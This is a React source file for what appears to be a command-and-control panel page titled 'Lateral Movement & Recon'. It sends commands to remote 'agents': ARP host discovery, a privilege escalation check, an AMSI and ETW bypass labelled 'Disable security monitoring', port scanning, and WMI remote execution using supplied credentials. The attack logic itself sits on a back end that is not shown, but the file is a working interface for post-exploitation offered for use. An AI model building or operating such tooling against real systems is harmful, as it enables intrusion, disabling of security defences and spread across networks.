import { useState, useEffect } from 'react'
import axios from 'axios'

interface Agent {
  agent_id: string
  hostname: string
  os: string
}

const LateralMovement = () => {
  const [agents, setAgents] = useState<Agent[]>([])
  const [selectedAgent, setSelectedAgent] = useState('')
  const [result, setResult] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [scanTarget, setScanTarget] = useState('')
  const [wmiTarget, setWmiTarget] = useState('')
  const [wmiUser, setWmiUser] = useState('')
  const [wmiPass, setWmiPass] = useState('')
  const [wmiCmd, setWmiCmd] = useState('')

  useEffect(() => {
    axios.get('/api/live/agents').then(res => {
      const agentsObj = res.data.agents || res.data
      const list = Object.entries(agentsObj).map(([id, info]: [string, any]) => ({
        agent_id: id, hostname: info.hostname || 'Unknown', os: info.os || 'Unknown',
      }))
      setAgents(list)
      if (list.length > 0) setSelectedAgent(list[0].agent_id)
    }).catch(() => {})
  }, [])

  const sendCommand = async (cmd: any) => {
    setLoading(true)
    setError('')
    setResult('')
    try {
      const res = await axios.post(`/api/live/agents/${selectedAgent}/command`, cmd)
      const cmdId = res.data?.cmd_id
      for (let i = 0; i < 60; i++) {
        await new Promise(r => setTimeout(r, 1000))
        const poll = await axios.get(`/api/live/agents/${selectedAgent}/result/${cmdId}`)
        if (poll.data?.status && poll.data.status !== 'pending') {
          if (poll.data.status === 'error') { setError(poll.data.error || 'Failed'); setLoading(false); return }
          setResult(poll.data.output || 'Done')
          setLoading(false)
          return
        }
      }
      setError('Command timed out')
    } catch (e: any) { setError(e.message) }
    setLoading(false)
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-white">Lateral Movement & Recon</h1>
        <select
          value={selectedAgent}
          onChange={e => setSelectedAgent(e.target.value)}
          className="bg-gray-800 text-white border border-gray-600 rounded px-3 py-2"
        >
          {agents.map(a => (
            <option key={a.agent_id} value={a.agent_id}>{a.hostname} ({a.os})</option>
          ))}
        </select>
      </div>

      {error && <div className="bg-red-900/30 border border-red-700 text-red-400 p-3 rounded">{error}</div>}

      {/* Quick Actions */}
      <div className="grid grid-cols-3 gap-4">
        <button
          onClick={() => sendCommand({ type: 'discover_hosts' })}
          disabled={loading || !selectedAgent}
          className="bg-gray-800 p-5 rounded-lg border border-gray-700 hover:border-blue-500 transition text-left disabled:opacity-50"
        >
          <div className="text-2xl mb-2">🌐</div>
          <h3 className="text-white font-semibold">ARP Discovery</h3>
          <p className="text-gray-400 text-sm mt-1">Scan local network for hosts</p>
        </button>
        <button
          onClick={() => sendCommand({ type: 'privesc_check' })}
          disabled={loading || !selectedAgent}
          className="bg-gray-800 p-5 rounded-lg border border-gray-700 hover:border-yellow-500 transition text-left disabled:opacity-50"
        >
          <div className="text-2xl mb-2">🔓</div>
          <h3 className="text-white font-semibold">Privesc Check</h3>
          <p className="text-gray-400 text-sm mt-1">Check privilege escalation vectors</p>
        </button>
        <button
          onClick={() => sendCommand({ type: 'amsi_bypass' })}
          disabled={loading || !selectedAgent}
          className="bg-gray-800 p-5 rounded-lg border border-gray-700 hover:border-red-500 transition text-left disabled:opacity-50"
        >
          <div className="text-2xl mb-2">🛡️</div>
          <h3 className="text-white font-semibold">AMSI + ETW Bypass</h3>
          <p className="text-gray-400 text-sm mt-1">Disable security monitoring</p>
        </button>
      </div>

      {/* Port Scanner */}
      <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
        <h3 className="text-cyan-400 font-semibold mb-3">Port Scanner</h3>
        <div className="flex gap-3">
          <input
            type="text"
            placeholder="Target IP (e.g. 192.168.1.100)"
            value={scanTarget}
            onChange={e => setScanTarget(e.target.value)}
            className="flex-1 bg-gray-900 text-white border border-gray-600 rounded px-3 py-2"
          />
          <button
            onClick={() => sendCommand({ type: 'port_scan', target: scanTarget })}
            disabled={loading || !selectedAgent || !scanTarget}
            className="bg-cyan-600 hover:bg-cyan-700 text-white px-6 py-2 rounded disabled:opacity-50"
          >
            {loading ? 'Scanning...' : 'Scan'}
          </button>
        </div>
      </div>

      {/* WMI Remote Execution */}
      <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
        <h3 className="text-orange-400 font-semibold mb-3">WMI Remote Execution</h3>
        <div className="grid grid-cols-2 gap-3 mb-3">
          <input placeholder="Target IP" value={wmiTarget} onChange={e => setWmiTarget(e.target.value)}
            className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2" />
          <input placeholder="Command" value={wmiCmd} onChange={e => setWmiCmd(e.target.value)}
            className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2" />
          <input placeholder="Username" value={wmiUser} onChange={e => setWmiUser(e.target.value)}
            className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2" />
          <input placeholder="Password" type="password" value={wmiPass} onChange={e => setWmiPass(e.target.value)}
            className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2" />
        </div>
        <button
          onClick={() => sendCommand({ type: 'wmi_exec', target: wmiTarget, username: wmiUser, password: wmiPass, command: wmiCmd })}
          disabled={loading || !selectedAgent || !wmiTarget || !wmiCmd}
          className="bg-orange-600 hover:bg-orange-700 text-white px-6 py-2 rounded disabled:opacity-50"
        >
          Execute
        </button>
      </div>

      {/* Results */}
      {result && (
        <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
          <h3 className="text-green-400 font-semibold mb-3">Results</h3>
          <pre className="text-gray-300 text-sm whitespace-pre-wrap font-mono bg-gray-900 p-4 rounded max-h-[500px] overflow-auto">
            {result}
          </pre>
        </div>
      )}
    </div>
  )
}

export default LateralMovement
